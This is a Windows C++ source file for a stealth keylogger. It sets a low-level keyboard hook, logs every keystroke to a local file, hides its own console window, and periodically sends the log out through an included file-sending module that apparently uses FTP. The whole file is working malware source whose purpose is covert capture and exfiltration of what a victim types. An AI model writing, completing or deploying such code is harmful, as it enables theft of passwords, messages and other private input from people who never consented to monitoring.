#define _WIN32_WINNT 0x0500
#include <fstream>
#include <windows.h>
#include "LogSender.hpp"
#include "FTP.hpp"
#include "file_send.cpp"
#include "timer.cpp"

using namespace std;

string buffer = "";
ofstream out("./keys.txt");

LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)(lParam);

    // If key is being pressed
    if (wParam == WM_KEYDOWN)
    {
        switch (p->vkCode)
        {
        // Invisible keys
        case VK_CAPITAL:
            out << "<CAPLOCK>";
            break;
        case VK_SHIFT:
            out << "<SHIFT>";
            break;
        case VK_LCONTROL:
            out << "<LCTRL>";
            break;
        case VK_RCONTROL:
            out << "<RCTRL>";
            break;
        case VK_INSERT:
            out << "<INSERT>";
            break;
        case VK_END:
            out << "<END>";
            break;
        case VK_PRINT:
            out << "<PRINT>";
            break;
        case VK_DELETE:
            out << "<DEL>";
            break;
        case VK_BACK:
            out << "<BK>";
            break;
        case VK_LEFT:
            out << "<LEFT>";
            break;
        case VK_RIGHT:
            out << "<RIGHT>";
            break;
        case VK_UP:
            out << "<UP>";
            break;
        case VK_DOWN:
            out << "<DOWN>";
            break;
        // Visible keys
        default:
            buffer += char(tolower(p->vkCode));
        }
    }

    if(mtx.try_lock()) {

            if (counter % 180 == 0){
                send_file("./keys.txt");
            }

            else if (counter % 60 == 0){
                out << buffer;

                buffer = "";
            }
           
            mtx.unlock();
            sleep(1);
        }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{

    HWND stealth; /*creating stealth (window is not visible)*/
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);
    
    // Set windows hook
    HHOOK keyboardHook = SetWindowsHookEx(
        WH_KEYBOARD_LL,
        keyboardHookProc,
        hInstance,
        0);

    MSG messages;

    while (GetMessage(&messages, NULL, 0, 0))
    {
        /* Translate virtual-key messages into character messages */
        TranslateMessage(&messages);
        /* Send message to WindowProcedure */
        DispatchMessage(&messages);
    }
}